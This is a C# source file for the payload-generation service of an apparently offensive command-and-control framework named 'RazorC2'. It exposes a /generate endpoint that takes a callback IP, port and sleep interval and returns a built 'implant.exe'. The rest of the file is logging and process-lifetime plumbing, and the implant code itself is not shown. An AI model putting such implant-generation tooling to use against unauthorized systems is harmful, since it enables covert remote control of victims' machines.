
// PayloadGenerationService/Program.cs
using System.Diagnostics;
using Microsoft.AspNetCore.Hosting.Server; // For IServer
using Microsoft.AspNetCore.Hosting.Server.Features; // For IServerAddressesFeature
using Microsoft.AspNetCore.Mvc; // For FromQuery
using RazorC2.PayloadGenerator.Services; // Namespace for PayloadBuilder
using Serilog;
using Serilog.Events;

namespace RazorC2.PayloadGenerator // Match namespace used in other files if desired
{
    public class PayloadGeneratorProgram
    {
        // --- Token Source for Parent Process Exit ---
        internal static CancellationTokenSource ParentProcessExitTokenSource = new CancellationTokenSource();

        public static async Task<int> Main(string[] args)
        {
            string logFilePath = Path.Combine(AppContext.BaseDirectory, "logs", "PayloadGenerationService_log_.txt"); // Specific log file
            Log.Logger = new LoggerConfiguration()
                .MinimumLevel.Debug()
                .MinimumLevel.Override("Microsoft", LogEventLevel.Warning) // Suppress framework noise
                .MinimumLevel.Override("System", LogEventLevel.Warning)
                .Enrich.FromLogContext()
                .WriteTo.Console() // Keep console for debug output from service itself
                .WriteTo.File(
                    path: logFilePath,
                    rollingInterval: RollingInterval.Day,
                    retainedFileCountLimit: 7,
                    outputTemplate: "{Timestamp:yyyy-MM-dd HH:mm:ss.fff zzz} [{Level:u3}] {Message:lj}{NewLine}{Exception}",
                    encoding: System.Text.Encoding.UTF8,
                    restrictedToMinimumLevel: LogEventLevel.Debug)
                .CreateLogger(); // Create logger directly

            // --- Argument Parsing ---
            int? parentProcessId = null;

            for (int i = 0; i < args.Length; i++)
            {
                // Check for --parent-pid (from ProcessManagerService)
                if (args[i].Equals("--parent-pid", StringComparison.OrdinalIgnoreCase) && i + 1 < args.Length)
                {
                    if (int.TryParse(args[i + 1], out int pid))
                    {
                        parentProcessId = pid;
                    }
                }
                // Ignore --urls, let builder handle it
            }
            Log.Debug($"[PayloadGeneration Process DEBUG] Raw Args Received: {string.Join(" ", args)}");
            Log.Debug($"[PayloadGeneration Process DEBUG] Parsed Parent PID: {parentProcessId?.ToString() ?? "null"}");

            // --- Start Parent Process Monitoring ---
            if (parentProcessId.HasValue)
            {
                Log.Information($"[PayloadGeneration Process] ==> Monitoring parent process PID: {parentProcessId}");
                MonitorParentProcess(parentProcessId.Value); // Start monitoring task
            }
            else
            {
                Log.Warning("[PayloadGeneration Process WARN] No parent PID provided. Process will not terminate automatically if parent exits.");
            }


            // --- WebApplication Setup ---
            var builder = WebApplication.CreateBuilder(args); // Pass args to respect --urls, environment variables etc.

            // --- Service Registration ---
            builder.Services.AddLogging(config =>
            {
                config.ClearProviders();
                config.AddConsole();
                config.SetMinimumLevel(LogLevel.Information); // Default to Info
                config.AddFilter("Microsoft.AspNetCore", LogLevel.Warning); // Quiet down ASP.NET noise
            });
            builder.Services.AddHostedService<PayloadServiceLifetimeService>(); // Register lifetime service
            builder.Services.AddScoped<PayloadBuilder>(); // <<< REGISTER THE BUILDER LOGIC SERVICE

            var app = builder.Build();
            var logger = app.Services.GetRequiredService<ILogger<PayloadGeneratorProgram>>();

            // --- Log listening addresses on startup ---
            app.Lifetime.ApplicationStarted.Register(() =>
            {
                logger.LogInformation("PayloadGenerationService ApplicationStarted event."); // Log startup event
                try
                {
                    var server = app.Services.GetService<IServer>();
                    var addressFeature = server?.Features.Get<IServerAddressesFeature>();
                    if (addressFeature?.Addresses != null && addressFeature.Addresses.Any())
                    {
                        logger.LogInformation("PayloadGenerationService listening on: {Addresses}", string.Join(", ", addressFeature.Addresses));
                    }
                    else
                    {
                        // Sometimes addresses feature might be populated slightly later or if using specific servers
                        logger.LogWarning("Could not immediately determine listening addresses via IServerAddressesFeature. Check logs further or applicationUrls setting.");
                        // Log URLs from configuration as a fallback indicator
                        var urlsFromConfig = builder.Configuration["Urls"];
                        if (!string.IsNullOrEmpty(urlsFromConfig)) logger.LogInformation("Configured URLs (might differ from actual binding): {URLs}", urlsFromConfig);
                    }
                }
                catch (Exception ex)
                {
                    logger.LogError(ex, "Error getting listening addresses.");
                }
            });

            logger.LogInformation("PayloadGenerationService starting application setup complete. Mapping endpoints...");


            // --- API Endpoint Definition ---
            app.MapPost("/generate", async (
                [FromQuery] string? ip,
                [FromQuery] int? port,
                [FromQuery] int? sleep,
                PayloadBuilder payloadBuilder, 
                ILogger<PayloadGeneratorProgram> endpointLogger 
            ) =>
            {
                // Input Validation
                if (string.IsNullOrWhiteSpace(ip))
                {
                    endpointLogger.LogWarning("Generation request failed: Missing 'ip' query parameter.");
                    return Results.BadRequest("Missing 'ip' query parameter.");
                }
                if (!port.HasValue || port <= 0 || port > 65535)
                {
                    endpointLogger.LogWarning("Generation request failed: Missing or invalid 'port' query parameter: {Port}", port);
                    return Results.BadRequest("Missing or invalid 'port' query parameter.");
                }

                int defaultSleep = sleep.HasValue && sleep.Value > 0 ? sleep.Value : 10; // Default to 10 if missing/invalid
                if (!sleep.HasValue || sleep.Value <= 0)
                {
                    endpointLogger.LogWarning("Invalid or missing 'sleep' parameter, using default: {DefaultSleep}", defaultSleep);
                }

                endpointLogger.LogInformation("Endpoint /generate called: IP={IP}, Port={Port}, Sleep={Sleep}", ip, port, defaultSleep);

                // --- Call the PayloadBuilder Service ---
                PayloadGenerationResult result = await payloadBuilder.GenerateExePayloadAsync(ip, port.Value, defaultSleep); // Hardcode net48 target

                // --- Handle Result ---
                if (result.Success && result.ExeBytes != null)
                {
                    endpointLogger.LogInformation("Generation successful via service, returning file.");
                    // Return the EXE file
                    return Results.File(result.ExeBytes, "application/vnd.microsoft.portable-executable", "implant.exe");
                }
                else
                {
                    // Log the detailed process output if available, even on failure
                    if (!string.IsNullOrWhiteSpace(result.ProcessOutput))
                    {
                        endpointLogger.LogError("Generation failed. Dotnet publish/build process output:\n{ProcessOutput}", result.ProcessOutput);
                    }
                    else
                    {
                        endpointLogger.LogError("Generation failed. Reason: {Reason}", result.ErrorMessage);
                    }
                    // Return a Problem response
                    return Results.Problem(
                        title: "Payload generation failed",
                        detail: result.ErrorMessage, // Pass error message back
                        statusCode: StatusCodes.Status500InternalServerError // Or 400 if it was input validation indirectly
                    );
                }
            });

            logger.LogInformation("Endpoints mapped. Running PayloadGenerationService...");

            // --- Run the service asynchronously using the cancellation token ---
            try
            {
                // Use RunAsync with the token so cancellation stops the server gracefully
                // URLs are typically configured via appsettings.json, launchSettings.json, or --urls arg passed to builder
                await app.RunAsync(ParentProcessExitTokenSource.Token);
            }
            catch (OperationCanceledException) when (ParentProcessExitTokenSource.IsCancellationRequested)
            {
                logger.LogInformation("PayloadGenerationService stopping due to parent process exit signal or StopApplication call.");
            }
            catch (Exception ex)
            {
                logger.LogCritical(ex, "PayloadGenerationService host terminated unexpectedly.");
                return 1; // Indicate error exit code
            }
            finally
            {
                logger.LogInformation("PayloadGenerationService shut down complete.");
            }

            return 0; // Indicate successful exit code
        } // End Main


        // --- Monitor Parent Process Function (Static Helper) ---
        private static void MonitorParentProcess(int parentPid)
        {
            Log.Information($"[PayloadGeneration Process] Attempting to monitor parent PID: {parentPid}"); // Use Console here as Logging might not be fully configured yet
            Task.Run(async () =>
            {
                Process? parentProcess = null;
                try
                {
                    try
                    {
                        parentProcess = Process.GetProcessById(parentPid);
                        Log.Information($"[PayloadGeneration Process] Successfully attached to parent process '{parentProcess.ProcessName}' (PID: {parentPid}). Waiting for exit...");
                    }
                    catch (ArgumentException)
                    {
                        Log.Error($"[PayloadGeneration Process WARN] Parent process (PID: {parentPid}) not found on startup. Assuming it exited or PID is wrong. Triggering self-shutdown.");
                        if (!ParentProcessExitTokenSource.IsCancellationRequested) ParentProcessExitTokenSource.Cancel();
                        return;
                    }
                    catch (Exception ex)
                    {
                        Log.Error($"[PayloadGeneration Process ERROR] Error getting parent process (PID: {parentPid}): {ex.Message}. Triggering self-shutdown.");
                        if (!ParentProcessExitTokenSource.IsCancellationRequested) ParentProcessExitTokenSource.Cancel();
                        return;
                    }

                    // Wait for the parent process to exit asynchronously, respecting cancellation
                    await parentProcess.WaitForExitAsync(ParentProcessExitTokenSource.Token);

                    if (ParentProcessExitTokenSource.IsCancellationRequested)
                    {
                        Log.Information("[PayloadGeneration Process] Monitoring cancelled, likely during controlled shutdown.");
                        return;
                    }

                    Log.Information($"[PayloadGeneration Process] Parent process (PID: {parentPid}) has exited. Initiating self-shutdown.");
                    if (!ParentProcessExitTokenSource.IsCancellationRequested) ParentProcessExitTokenSource.Cancel();
                }
                catch (InvalidOperationException)
                { // Can happen if process exits right after GetProcessById before WaitForExitAsync attaches
                    Log.Warning($"[PayloadGeneration Process WARN] Parent process (PID: {parentPid}) may have already exited.");
                    if (!ParentProcessExitTokenSource.IsCancellationRequested) ParentProcessExitTokenSource.Cancel();
                }
                catch (OperationCanceledException)
                {
                   Log.Warning("[PayloadGeneration Process] Parent process monitoring task was cancelled.");
                    // Cancellation is expected during shutdown, no need to re-cancel token
                }
                catch (Exception ex)
                {
                    Log.Error($"[PayloadGeneration Process ERROR] Error monitoring parent process: {ex.Message}. Initiating self-shutdown.");
                    if (!ParentProcessExitTokenSource.IsCancellationRequested) ParentProcessExitTokenSource.Cancel();
                }
                finally
                {
                    // Clean up Process object if acquired
                    parentProcess?.Dispose();
                }
            });
        } // End MonitorParentProcess

    } // End Class


    // --- Lifetime Service (Handles graceful shutdown on token cancellation) ---
    public class PayloadServiceLifetimeService : IHostedService
    {
        private readonly IHostApplicationLifetime _appLifetime;
        private readonly ILogger<PayloadServiceLifetimeService> _logger;

        public PayloadServiceLifetimeService(IHostApplicationLifetime appLifetime, ILogger<PayloadServiceLifetimeService> logger)
        {
            _appLifetime = appLifetime;
            _logger = logger;
        }

        public Task StartAsync(CancellationToken cancellationToken)
        {
            // Register the callback on the static token source from the main program class
            PayloadGeneratorProgram.ParentProcessExitTokenSource.Token.Register(() =>
            {
                _logger.LogInformation("[PayloadServiceLifetimeService] Parent process exit detected via token, requesting application stop.");
                _appLifetime.StopApplication(); // Trigger Kestrel/Host shutdown
            });
            _logger.LogInformation("[PayloadServiceLifetimeService] StartAsync completed, registered callback for parent exit.");
            return Task.CompletedTask;
        }

        public Task StopAsync(CancellationToken cancellationToken)
        {
            _logger.LogInformation("[PayloadServiceLifetimeService] StopAsync called.");
            // Can add cleanup here if needed during graceful shutdown
            return Task.CompletedTask;
        }
    }

} // End namespace

